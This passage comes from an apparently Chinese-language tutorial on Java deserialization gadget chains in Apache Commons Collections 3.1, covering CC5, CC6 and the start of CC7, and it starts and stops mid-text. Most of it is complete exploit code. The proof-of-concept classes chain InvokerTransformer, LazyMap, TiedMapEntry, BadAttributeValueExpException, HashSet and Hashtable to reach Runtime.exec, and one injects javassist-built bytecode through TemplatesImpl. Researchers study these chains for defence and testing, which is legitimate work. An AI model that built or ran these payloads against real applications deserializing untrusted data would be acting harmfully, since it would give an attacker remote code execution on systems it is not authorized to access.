&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>前面部分和CC1一样，这也不多BB了</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);        lazymap.get(&#39;s&#39;);</code></pre><p>下一步寻找调用了get()的地方，还是找到了这个类<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p><pre><code class="java">public Object getValue() &#123;        return map.get(key);    &#125;</code></pre><p>然后寻找调用<code>getValue</code>的地方</p><p>这个跟上面出现过的链子不同，这条链子不在用<code>hashCode</code>这个方法，而是用toString()</p><pre><code class="java"> public String toString() &#123;        return getKey() + &quot;=&quot; + getValue();    &#125;</code></pre><pre><code class="java">TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);tiedmapentry.toString();</code></pre><p>然后找调用了<code>toString()</code>的地方</p><p>然后就找到了这个类<code>javax.management.BadAttributeValueExpException</code></p><pre><code class="java">public BadAttributeValueExpException (Object val) &#123;        this.val = val == null ? null : val.toString();    &#125;private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;        ObjectInputStream.GetField gf = ois.readFields();        Object valObj = gf.get(&quot;val&quot;, null);        if (valObj == null) &#123;            val = null;        &#125; else if (valObj instanceof String) &#123;            val= valObj;        &#125; else if (System.getSecurityManager() == null                || valObj instanceof Long                || valObj instanceof Integer                || valObj instanceof Float                || valObj instanceof Double                || valObj instanceof Byte                || valObj instanceof Short                || valObj instanceof Boolean) &#123;            val = valObj.toString();        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();        &#125;    &#125;</code></pre><p>这个类的构造函数和readObject都可以调用<code>toString()</code>，如果使用的是构造函数触发，直接<code>new BadAttributeValueExpException(tiedmapentry);</code>就触发了，如果使用readObject()触发，这里需要通过反射给参数val赋值</p><p>再这个readObject中，需要控制<code>valObj </code>的值为tiedmapentry, 而valObj的值来源于</p><pre><code class="java">ObjectInputStream.GetField gf = ois.readFields();Object valObj = gf.get(&quot;val&quot;, null);</code></pre><p>就是通过 <code>ois.readFields()</code> 方法获取一个 <code>ObjectInputStream.GetField</code> 对象，该对象可以读取对象的字段值,然后通过 <code>gf.get(&quot;val&quot;, null)</code> 方法获取字段名为 “val” 的字段值,如果该值为 null，将 <code>val</code> 设置为 null</p><pre><code class="java">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);//令val=null,再通过反射修改Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);val.setAccessible(true);val.set(badAttributeValueExpException,tiedmapentry);serialize(badAttributeValueExpException);unserialize(&quot;ser.bin&quot;);</code></pre><h3 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h3><p>完整的利用链如下：</p><pre class="mermaid">graph TBA("javax.management.BadAttributeValueExpException#\nreadObject()")-->B("org.apache.commons.collections.keyvalue.TiedMapEntry#\ntoString()")-->C("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")-->D("org.apache.commons.collections.map.LazyMap#\nget()")-->E("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->F("org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->G("Runtime.getRuntime.exec")</pre><p>完整POC：</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import javax.management.BadAttributeValueExpException;public class App &#123;    public static void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.toString();        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);        Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(badAttributeValueExpException,tiedmapentry);        serialize(badAttributeValueExpException);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h3><p>上面poc1中已经到了<code>ChainedTransformer</code>,那就是可以不用<code>InvokerTransformer</code>这条链，可以修改一下走<code>InstantiateTransformer</code>–&gt;<code>TrAXFilter</code>–&gt;<code>TemplatesImpl</code>这条链</p><p>利用链：</p><pre class="mermaid">graph TBA("javax.management.BadAttributeValueExpException#\nreadObject()")-->B("org.apache.commons.collections.keyvalue.TiedMapEntry#\ntoString()")-->C("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")-->D("org.apache.commons.collections.map.LazyMap#\nget()")-->E("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->F("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->G("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->L("Runtime.getRuntime.exec")</pre><p>最终POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&#39;a&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,transformerChain);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.toString();        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);        Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(badAttributeValueExpException,tiedmapentry);        serialize(badAttributeValueExpException);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>条件：</p><p>commons-collections:3.1-3.2.1</p><p>jdk无限制</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>前半部分是和前面的链子是相同的，不再分析</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);        tiedmapentry.hashCode();</code></pre><p>和CC1的&gt;8u71那条链子一样，使用了hashCode()来调用getValue()方法</p><pre><code class="java">public int hashCode() &#123;        Object value = getValue();        return (getKey() == null ? 0 : getKey().hashCode()) ^               (value == null ? 0 : value.hashCode());     &#125;</code></pre><p>还是和CC1的&gt;8u71那条链子一样，通过HashMap的hash方法来调用这个hashCode()，再使用put方法方法调用hash()</p><pre><code class="java">static final int hash(Object key) &#123;    int h;    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;public V put(K key, V value) &#123;        return putVal(hash(key), key, value, false, true);    &#125;</code></pre><p>不同的是这条链子使用的是<code>HashSet</code>的readObject来进行收尾，这个方法里调用了put方法，而且在属性定义可以知道这个map就是HashMap</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException &#123;        // Read in any hidden serialization magic    ........        // Create backing HashMap        map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :               new HashMap&lt;E,Object&gt;(capacity, loadFactor));        // Read in all elements in the proper order.        for (int i=0; i&lt;size; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                E e = (E) s.readObject();            map.put(e, PRESENT);        &#125;    &#125;</code></pre><p>按照目前的想法,构造的poc如下</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();//        HashMap hashMap = new HashMap();//        hashMap.put(tiedmapentry, &quot;test&quot;);        HashSet hashset = new HashSet(1);        hashset.add(tiedmapentry);                serialize(hashset);        unserialize(&quot;ser.bin&quot;);</code></pre><p>但是这个写法会出现一个问题，程序运行时，在<code>hashset.add(tiedmapentry);</code>这里就触发执行了命令，因为这个add()里面调用了put方法</p><pre><code class="java">public boolean add(E e) &#123;        return map.put(e, PRESENT)==null;    &#125;</code></pre><p>因为这里就触发了命令执行，执行命令后往后继续运行报错，没有走到序列化和反序列化的代码，所以要稍微修改一下</p><p>首先，在开头构造<code>transformers</code>链的时候先给一个无意义的链，让程序先执行</p><pre><code class="java">Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;//无意义的链ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);//        chainedTransformer.transform(&#39;s&#39;);Map map = new HashMap&lt;&gt;();Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();//        HashMap hashMap = new HashMap();//        hashMap.put(tiedmapentry, &quot;test&quot;);HashSet hashset = new HashSet(1);hashset.add(tiedmapentry);</code></pre><p>这样就不会执行命令了，</p><p>注意：要删除掉lazymap中的已经存在的key,否则不会进入get的if判断，导致利用链断裂</p><pre><code class="java">lazymap.remove(&quot;abc&quot;);</code></pre><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>然后再通过反射修改回真正的链</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);f.setAccessible(true);f.set(chainedTransformer, transformers);</code></pre><p>利用链如下：</p><pre class="mermaid">graph TBA("java.util.HashSet#\nreadObject()")-->B("java.util.HashMap#\nput()")-->C("java.util.HashMap#\nhash()")-->D("org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()")-->E("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")-->F("org.apache.commons.collections.map.LazyMap#\nget()")-->G("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->H("org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->I("Runtime.getRuntime.exec")</pre><p>最后的POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.HashSet;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import javax.management.BadAttributeValueExpException;public class App&#123;    public static void main(String[] args) throws ClassNotFoundException, IOException, IllegalAccessException, NoSuchFieldException &#123;        Transformer[] fakeTransformers = new Transformer[] &#123;&#125;;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();//        HashMap hashMap = new HashMap();//        hashMap.put(tiedmapentry, &quot;test&quot;);        HashSet hashset = new HashSet(1);        hashset.add(tiedmapentry);        lazymap.remove(&quot;abc&quot;);        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        f.setAccessible(true);        f.set(chainedTransformer, transformers);        serialize(hashset);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p>还可以像CC5一样走<code>InstantiateTransformer</code>和<code>TrAXFilter</code>这条链，这里就不写了</p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>条件：</p><p>commons-collections:3.1-3.2.1</p><p>jdk无限制</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>前面部分和CC1的是一样的:</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);        lazymap.get(&#39;s&#39;);</code></pre><p>然后寻找调用get()的地方，前面的利用链中用的是AnnotationInvocationHandler类的invoke()或者TiedMapEntry类的getValue()，而这次用的是AbstractMap的equals方法,这个方法是用来比较两个对象是否相等的</p><pre><code class="java">public boolean equals(Object o) &#123;        if (o == this)            return true;        if (!(o instanceof Map))            return false;        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;        if (m.size() != size())            return false;        try &#123;            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();            while (i.hasNext()) &#123;                Entry&lt;K,V&gt; e = i.next();                K key = e.getKey();                V value = e.getValue();                if (value == null) &#123;                    if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))                        return false;                &#125; else &#123;                    if (!value.equals(m.get(key)))                        return false;                &#125;            &#125;        &#125; catch (ClassCastException unused) &#123;            return false;        &#125; catch (NullPointerException unused) &#123;            return false;        &#125;        return true;    &#125;</code></pre><p>这个方法调用了<code>m.get(key)</code>,其中m是来自<code>Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</code> ,而 o 是传入的参数，可控，但是需要过三个if判断</p><p>然后寻找哪个地方调用了<code>equals</code></p><p>这里使用的是HashTable的reconstitutionPut方法</p><pre><code class="java">private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)        throws StreamCorruptedException    &#123;        if (value == null) &#123;            throw new java.io.StreamCorruptedException();        &#125;        // Makes sure the key is not already in the hashtable.        // This should not happen in deserialized version.        int hash = key.hashCode();        int index = (hash &amp; 0x7FFFFFFF) % tab.length;        for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;                throw new java.io.StreamCorruptedException();            &#125;        &#125;        // Creates the new entry.        @SuppressWarnings(&quot;unchecked&quot;)            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];        tab[index] = new Entry&lt;&gt;(hash, key, value, e);        count++;    &#125;</code></pre><p>这里面e是参数tab的索引，如果e.key是AbstractMap，那么就可以调用AbstractMap.equals方法。这个方法是私有方法不能直接调用</p><p>然后查看在哪里调用了<code>reconstitutionPut</code>，只有在这个类的readObject方法调用了</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)         throws IOException, ClassNotFoundException    &#123;      .........        length = Math.min(length, origlength);        table = new Entry&lt;?,?&gt;[length];        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);        count = 0;        // Read the number of elements and then all the key/value objects        for (; elements &gt; 0; elements--) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K)s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V)s.readObject();            // sync is eliminated for performance            reconstitutionPut(table, key, value);        &#125;    &#125;</code></pre><p>这里的key与value就是我们自己存进去的，for循环是遍历hashtable对象中的元素</p><p>乍一看链子也就这样了，其实还有很多坑</p><p>目前的构造:</p><pre><code class="java">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);Map map = new HashMap&lt;&gt;();Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);Hashtable hashTable = new Hashtable();hashTable.put(lazymap, 1);serialize(hashTable);unserialize(&quot;ser.bin&quot;);</code></pre><p>经过调试发现，在reconstitutionPut()中，无法进入for循环</p><pre><code class="java">int hash = key.hashCode();int index = (hash &amp; 0x7FFFFFFF) % tab.length;for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;    if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;        throw new java.io.StreamCorruptedException();    &#125;&#125;// Creates the new entry.        @SuppressWarnings(&quot;unchecked&quot;)            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];        tab[index] = new Entry&lt;&gt;(hash, key, value, e);        count++;</code></pre><p>此时hash&#x3D;0 这个key就是lazymap, 这个for循环是遍历这个tab, tab的所有值显示为null，说明没有值，所以没有进入for循环，直接运行到后面，将内容保存到tab里面<code>tab[index] = new Entry&lt;&gt;(hash, key, value, e);</code></p><p>这就说明，无论第一个键值对是什么都不会进如循环里面，所以要添加第二个键值对</p><pre><code class="java">Map hashMap1 = new HashMap();Map hashMap2 = new HashMap();Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);lazyMap1.put(&quot;a&quot;, 1);Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);lazyMap2.put(&quot;b&quot;, 1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);serialize(hashtable);unserialize(&quot;ser.bin&quot;);</code></pre><p>这里一定要使用不同的hashmap，不然再hashtable.put的时候会认为是同一个</p><p>然后继续调试，又回到了for循环</p><pre><code class="java">for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;    if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;        throw new java.io.StreamCorruptedException();    &#125;&#125;</code></pre><p>这里要满足<code>e.hash == hash</code>就是第一个key的hash和第二个key的hash相等，如果不相等则直接为false，不执行后面的equals了</p><p>这里不能直接将两个key设置为相等的，因为在lazymap的get方法中有以下逻辑，map的key不能重复否则就不会执行transform函数执行代码了</p><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>所以只能构造为”yy” “zZ”这两个key</p><pre><code class="java">Map hashMap1 = new HashMap();Map hashMap2 = new HashMap();Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);lazyMap1.put(&quot;yy&quot;, 1);Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);lazyMap2.put(&quot;zZ&quot;, 1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);serialize(hashtable);unserialize(&quot;ser.bin&quot;);</code></pre><p>运行后发现，还没有就行反序列化，命令执行就触发了，原来是在<code>hashtable.put(lazyMap2, 1);</code>的时候刚好触发了put方法里面的<code>equals</code>方法，然后就没有往下执行了</p><pre><code class="java">public synchronized V put(K key, V value) &#123;        // Make sure the value is not null        if (value == null) &#123;            throw new NullPointerException();        &#125;        // Makes sure the key is not already in the hashtable.        Entry&lt;?,?&gt; tab[] = table;        int hash = key.hashCode();        int index = (hash &amp; 0x7FFFFFFF) % tab.length;        @SuppressWarnings(&quot;unchecked&quot;)        Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];        for(; entry != null ; entry = entry.next) &#123;            if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;                V old = entry.value;                entry.value = value;                return old;            &#125;        &#125;        addEntry(hash, key, value, index);        return null;    &#125;</code></pre><p>解决这个问题和CC6一样，先构造<code>transformers</code>链的时候先给一个无意义的链，让程序先执行，然后再通过反射修改回来</p><pre><code class="java">Transformer transformerChain = new ChainedTransformer(fakeTransformers);        Map innerMap1 = new HashMap();        Map innerMap2 = new HashMap();        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);        lazyMap1.put(&quot;yy&quot;, 1);        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);        lazyMap2.put(&quot;zZ&quot;, 1);        Hashtable hashtable = new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 1);        Field field = 